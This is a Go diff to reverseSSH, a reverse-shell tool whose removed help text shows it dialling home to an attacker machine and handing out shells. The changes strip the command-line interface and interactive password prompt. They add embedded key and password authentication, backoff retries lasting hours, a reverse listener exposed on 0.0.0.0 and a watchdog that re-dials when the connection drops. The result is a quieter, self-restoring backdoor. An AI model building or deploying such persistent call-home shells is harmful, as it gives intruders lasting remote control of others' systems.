@@ -18,34 +18,30 @@ package main
 
 import (
 	"bytes"
-	"flag"
+	"context"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"net"
 	"os"
 	"os/user"
-	"path"
-	"strconv"
 	"strings"
-	"syscall"
+	"time"
 
 	"github.com/gliderlabs/ssh"
 	"github.com/pkg/sftp"
 	gossh "golang.org/x/crypto/ssh"
-	"golang.org/x/term"
 )
 
 type params struct {
-	LUSER        string
-	LHOST        string
-	LPORT        uint
-	homeBindPort uint
-	listen       bool
-	shell        string
-	noShell      bool
-	verbose      bool
+	LUSER    string
+	LHOST    string
+	LPORT    uint
+	BindPort uint
+	Listen   bool
+	shell    string
+	noShell  bool
+	verbose  bool
 }
 
 func createLocalPortForwardingCallback(forbidden bool) ssh.LocalPortForwardingCallback {
@@ -127,48 +123,56 @@ func createSFTPHandler() ssh.SubsystemHandler {
 	}
 }
 
-func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool) (net.Listener, error) {
+func dialHomeAndListen(username string, address string, homeBindPort uint, reversePWD string, reverseKey string, retry_max int) (net.Listener, error) {
 	var (
 		err    error
 		client *gossh.Client
 	)
-
+	key, err := gossh.ParsePrivateKey([]byte(reverseKey))
+	if err != nil {
+		return nil, err
+	}
 	config := &gossh.ClientConfig{
 		User: username,
 		Auth: []gossh.AuthMethod{
-			gossh.Password(localPassword),
+			gossh.PublicKeys(key),
+			gossh.Password(reversePWD),
 		},
 		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
 	}
 
 	// Attempt to connect with localPassword initially and keep asking for password on failure
+	var fail_count = 0
+	var timeout = 10 * time.Second
 	for {
 		client, err = gossh.Dial("tcp", address, config)
 		if err == nil {
 			break
-		} else if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
-			fmt.Println("Enter password:")
-			data, err := term.ReadPassword(int(syscall.Stdin))
-			if err != nil {
-				log.Println(err)
-				continue
-			}
-
-			config.Auth = []gossh.AuthMethod{
-				gossh.Password(string(data)),
+		} else if retry_max < 0 || fail_count < retry_max {
+			time.Sleep(timeout)
+			log.Println(err)
+			log.Printf("retry %d/%d", fail_count, retry_max)
+			fail_count++
+			if timeout < 6*time.Hour {
+				timeout *= 2
+			} else {
+				timeout = 2 * time.Hour
 			}
 		} else {
 			return nil, err
 		}
 	}
-
-	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", homeBindPort))
+	ln, err := client.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", homeBindPort))
 	if err != nil {
 		return nil, err
 	}
-	log.Printf("Success: listening at home on %s", ln.Addr().String())
+	actualPort = strings.Split(ln.Addr().String(), ":")[1]
+
+	//TODO: lnu, err := client.Listen("unix", "/tmp/ssh-reverse.sock") //必须为绝对路径
+	log.Printf("Success: up on %s", actualPort)
 
 	// Attempt to send extra info back home in the info message of an extra ssh channel
+	//TODO: sendExtraInfo(client, lnu.Addr().String())
 	sendExtraInfo(client, ln.Addr().String())
 
 	return ln, nil
@@ -196,10 +200,11 @@ func sendExtraInfo(client *gossh.Client, listeningAddress string) {
 	}
 
 	newChan, newReq, err := client.OpenChannel("rs-info", gossh.Marshal(&extraInfo))
-	// The receiving end is expected to reject the channel, so "th4nkz" is a sign of success and we ignore it
+	//// The receiving end is expected to reject the channel, so "th4nkz" is a sign of success and we ignore it
 	if err != nil && !strings.Contains(err.Error(), "th4nkz") {
 		log.Printf("Could not create info channel: %+v", err)
 	}
+
 	// If the channel is actually accepted, just close it again
 	if err == nil {
 		go gossh.DiscardRequests(newReq)
@@ -223,147 +228,69 @@ func createExtraInfoHandler() ssh.ChannelHandler {
 			extraInfo.Hostname,
 			extraInfo.ListeningAddress,
 		)
+		go func() {
+			err := conn.Wait()
+			log.Printf("conn from %s: %s on %s Closed %+v",
+				conn.RemoteAddr(),
+				extraInfo.CurrentUser,
+				extraInfo.Hostname, err)
+		}()
 	}
 }
 
-func setupParameters(noCLI string) *params {
-	if noCLI != "" {
-		return setupParametersWithoutCLI()
-	}
-
-	var help = fmt.Sprintf(`reverseSSH v%[2]s  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>
-
-Usage: %[1]s [options] [[<user>@]<target>]
-
-Examples:
-  Bind:
-	%[1]s -l
-	%[1]s -v -l -p 4444
-  Reverse:
-	%[1]s 192.168.0.1
-	%[1]s kali@192.168.0.1
-	%[1]s -p 31337 192.168.0.1
-	%[1]s -v -b 0 kali@192.168.0.2
-
-Options:
-	-l, Start reverseSSH in listening mode (overrides reverse scenario)
-	-p, Port at which reverseSSH is listening for incoming ssh connections (bind scenario)
-		or where it tries to establish a ssh connection (reverse scenario) (default: %[6]s)
-	-b, Reverse scenario only: bind to this port after dialling home (default: %[7]s)
-	-s, Shell to spawn for incoming connections, e.g. /bin/bash; (default: %[5]s)
-		for windows this can only be used to give a path to 'ssh-shellhost.exe' to
-		enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
-	-N, Deny all incoming shell/exec/subsystem and local port forwarding requests
-		(if only remote port forwarding is needed, e.g. when catching reverse connections)
-	-v, Emit log output
-
-<target>
-	Optional target which enables the reverse scenario. Can be prepended with
-	<user>@ to authenticate as a different user other than '%[8]s' while dialling home
-
-Credentials:
-	Accepting all incoming connections from any user with either of the following:
-	 * Password "%[3]s"
-	 * PubKey   "%[4]s"
-`, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell, LPORT, BPORT, LUSER)
-
-	flag.Usage = func() {
-		fmt.Print(help)
-		os.Exit(1)
-	}
-
-	p := params{}
-
-	lport, err := strconv.ParseUint(LPORT, 10, 32)
-	if err != nil {
-		log.Fatal("Cannot convert LPORT: ", err)
-	}
-	homeBindPort, err := strconv.ParseUint(BPORT, 10, 32)
-	if err != nil {
-		log.Fatal("Cannot convert BPORT: ", err)
-	}
-	flag.UintVar(&p.LPORT, "p", uint(lport), "")
-	flag.UintVar(&p.homeBindPort, "b", uint(homeBindPort), "")
-	flag.BoolVar(&p.listen, "l", false, "")
-	flag.StringVar(&p.shell, "s", defaultShell, "")
-	flag.BoolVar(&p.noShell, "N", false, "")
-	flag.BoolVar(&p.verbose, "v", false, "")
-	flag.Parse()
-
-	if !p.verbose {
-		log.SetOutput(ioutil.Discard)
-	}
-
-	switch len(flag.Args()) {
-	case 0:
-		p.LUSER = LUSER
-		p.LHOST = LHOST
-	case 1:
-		target := strings.Split(flag.Args()[0], "@")
-		switch len(target) {
-		case 1:
-			p.LUSER = LUSER
-			p.LHOST = target[0]
-		case 2:
-			p.LUSER = target[0]
-			p.LHOST = target[1]
-		default:
-			log.Fatalf("Could not parse '%s'", target)
-		}
-
-	default:
-		log.Println("Invalid arguments, check usage!")
-		os.Exit(1)
-	}
-
-	return &p
-}
-
-func setupParametersWithoutCLI() *params {
-	lport, err := strconv.ParseUint(LPORT, 10, 32)
-	if err != nil {
-		log.Fatal("Cannot convert LPORT: ", err)
-	}
-	homeBindPort, err := strconv.ParseUint(BPORT, 10, 32)
-	if err != nil {
-		log.Fatal("Cannot convert BPORT: ", err)
-	}
-
-	log.SetOutput(ioutil.Discard)
-
-	return &params{
-		LUSER:        LUSER,
-		LHOST:        LHOST,
-		LPORT:        uint(lport),
-		homeBindPort: uint(homeBindPort),
-		listen:       false,
-		shell:        defaultShell,
-		noShell:      false,
-		verbose:      false,
-	}
-}
-
-func run(p *params, server ssh.Server) {
-	var (
-		ln  net.Listener
-		err error
-	)
-
-	if p.listen || p.LHOST == "" {
-		log.Printf("Starting ssh server on :%d", p.LPORT)
-		ln, err = net.Listen("tcp", fmt.Sprintf(":%d", p.LPORT))
-		if err == nil {
-			log.Printf("Success: listening on %s", ln.Addr().String())
-		}
+func runL(p *params, server *ssh.Server) {
+	log.Printf("Starting ssh server on :%d", p.LPORT)
+	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", p.LPORT))
+	if err == nil {
+		log.Printf("Success: listening on %s", ln.Addr().String())
 	} else {
-		target := net.JoinHostPort(p.LHOST, fmt.Sprintf("%d", p.LPORT))
-		log.Printf("Dialling home via ssh to %s", target)
-		ln, err = dialHomeAndListen(p.LUSER, target, p.homeBindPort, p.verbose)
-	}
-
-	if err != nil {
 		log.Fatal(err)
 	}
 	defer ln.Close()
 	log.Fatal(server.Serve(ln))
+}
+
+var actualPort string
+var connecting = false
+
+func runRAndCheck(p *params, server *ssh.Server) {
+	target := net.JoinHostPort(p.LHOST, fmt.Sprintf("%d", p.LPORT))
+	actualPort = fmt.Sprintf("%d", p.BindPort)
+	go runR(p.LUSER, target, p.BindPort, server)
+	ticker := time.NewTicker(1 * time.Minute)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		aim := net.JoinHostPort(p.LHOST, actualPort)
+		if !(connecting || checkConn(aim)) {
+			connecting = true
+			server.Shutdown(context.TODO())
+			go runR(p.LUSER, target, p.BindPort, server)
+			ticker.Stop()
+		}
+	}
+}
+func runR(LUSER, target string, BindPort uint, server *ssh.Server) {
+	log.Printf("Dialling home via ssh to %s", target)
+	ln, err := dialHomeAndListen(LUSER, target, BindPort, reversePWD, reverseKey, retryMax)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer ln.Close()
+	connecting = false
+	log.Println(server.Serve(ln))
+}
+
+// check if the reverse port is open
+func checkConn(target string) bool {
+	var (
+		err error
+	)
+	log.Printf("Dialling %s", target)
+	_, err = net.DialTimeout("tcp", target, 5*time.Second)
+	if err != nil {
+		log.Println(err)
+		return false
+	}
+	return true
 }
